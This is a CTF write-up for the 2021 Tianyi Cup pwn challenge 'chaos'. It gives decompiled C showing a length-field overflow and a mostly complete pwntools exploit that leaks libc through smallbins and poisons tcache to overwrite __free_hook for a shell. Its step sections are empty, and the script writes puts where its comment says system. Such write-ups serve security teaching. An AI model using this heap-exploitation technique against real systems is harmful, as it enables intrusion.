

# 2021 天翼杯 pwn: chaos

> 2021第二届“天翼杯”网络安全攻防大赛 pwn
>
> challenge name: chaos
>
> Description: try to exploit the hidden logic!



# Pre Analysis

```python
[*] '/home/kali/CTF/tianyi/chaos/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开

# IDA Analysis

Vulnerability: create方法中，len字段存储在512B的位置，但是len最大可以取520B，read时会将len字段覆盖掉。程序中利用到的漏洞点有：

1. create: 申请520B空间时，len字段被覆盖
2. show: 调`puts`输出
3. edit: 使用512B处记录的len来决定read的长度，导致len被修改时，可以read任意长度，越界写入后面的chunks

create函数：

```c
unsigned __int64 __fastcall create(const char *a1)
{
  int len; // [rsp+14h] [rbp-2Ch]
  __int64 buf; // [rsp+18h] [rbp-28h]
  char *arr_ptr_ori; // [rsp+20h] [rbp-20h]
  char s[12]; // [rsp+2Ch] [rbp-14h] BYREF
  unsigned __int64 v6; // [rsp+38h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( strcmp(a1, "Cr4at3") )
  {
    puts("error.");
    exit(5);
  }
  printf(">>> ");
  memset(s, 0, sizeof(s));
  read(0, s, 11uLL);
  len = atoi(s);
  if ( len <= 0 || len > 520 )                  // len 最大520
  {
    puts("error.");
    exit(5);
  }
  buf = (__int64)malloc(528uLL);                // 实际上分配出来的大小是544=0x220
  *(_QWORD *)(buf + 520) = 0LL;
  arr_ptr_ori = (char *)arr_ptr;
  arr_ptr = buf;
  *(_QWORD *)(buf + 520) = arr_ptr_ori;         // [rax+208h], rdx 把arr_ptr往后移，相当于往链表头插入指针
  *(_DWORD *)(buf + 512) = len;                 // [rax+200h], edx 长度最长为520B
  printf(">>> ");
  read(0, (void *)buf, *(unsigned int *)(buf + 512));// vul: 用512B处的内容作为len，但是这是可以读入覆盖的
  return __readfsqword(0x28u) ^ v6;
}
```



# Exploit

```python
from pwn import *

context.log_level = 'debug'
libc = ELF("./libc-2.27.so")

sh = process(["./ld277-3ubuntu1.so", "./chall"], env={"LD_PRELOAD": "./libc-2.27.so"})
# sh = remote("8.134.97.12", 26756)


def create(size, content):
    sh.sendafter(">>> ", "opcode: 1\npasswd: Cr4at30\n\n")
    sh.sendafter(">>> ", str(size))
    sh.sendafter(">>> ", content)


def show(idx):
    sh.sendafter(">>> ", "opcode: 2\npasswd: SH0w0\n\n")
    sh.sendafter(">>> ", str(idx))
    return sh.recvuntil('\n', drop=True)


def edit(idx, content):
    sh.sendafter(">>> ", "opcode: 3\npasswd: Ed1t0\n\n")
    sh.sendafter(">>> ", str(idx))
    sh.sendafter(">>> ", content)


def delete(idx):
    sh.sendafter(">>> ", "opcode: 4\npasswd: D3l4te0\n\n")
    sh.sendafter(">>> ", str(idx))


for i in range(9):  # create 0~8
    create(520, 'A')  # malloc(528uLL) chunk size=544=0x220
for i in range(7):  # delete 8~2 # full tcache(0x220) size=7
    delete(8 - i)

delete(0)  # to unsorted bin chunk*1(0x220)
delete(0)  # unsorted bin chunk(0x220, 0x200)  0x200??? some chunk take 0x20???

create(520, 'A' * 520)  # malloc from tcache, tcache(0x220) size=6 # but unsorted bin, small bin change
# unsorted bin chunk*1(0x1e0)    small_bins[33]: chunk*1(size=0x220)

edit(0, 'A' * 0x238 + 'a' * 8)  # cover the size field of next chunk into 'a'*8
# small_bins[33]: fw=0x5555565bd230, bk=0x5555565bd230 Chunk(addr=0x5555565bd240, size=0x6161616161616160


leak_data = show(0)[0x240:]  # addr in libc
# idx=0 's next chunk in small bins, leak libc addr through small bins
libc.address = u64(leak_data.ljust(8, b'\x00')) + 0x00007f4fc852a000 - 0x7f4fc8915eb0
# - 0x00007f7c48fe9eb0 + 0x00007f7c48bfe000 -(leak addr)+(libc base addr in vmmap)
print(hex(libc.address))
# edit(0, b'A' * 0x238 + p64(0x221))
edit(0, (b'A' * 0x208).ljust(0x238, b'\x00') + p64(0x221))  # 520=0x208 # to chunk size=0x220

create(520, b"deadbeef".ljust(512, b'b'))  # tcache(0x220) size=5 # this chunk is in idx=0 now


delete(1)  # chunk with AAAAAAA
delete(0)  # chunk with deadbeefbbbbb


create(520, 'A' * 520)
# cover the fd field of the chunk in tcache into __free_hook
edit(0, (b'A' * 0x208).ljust(0x238, b'\x00') + p64(0x221) + p64(libc.symbols["__free_hook"]))
# tcache(0x220)-> chunk0 -> __free_hook
gdb.attach(sh)  # gdb

create(520, "/bin/sh\0")  # get chunk0 in tcache
create(520, p64(libc.symbols['puts']))  # system # modify __free_hook to system
delete(1)  # "/bin/sh\0" chunk'idx is 1 now # equal to call system("/bin/sh")

sh.interactive()

```



# Step-1: Leak Libc using Smallbins





# Step-2: Cover fd of the Chunk in Tcache into`__free_hook`



# Step-3: Getshell

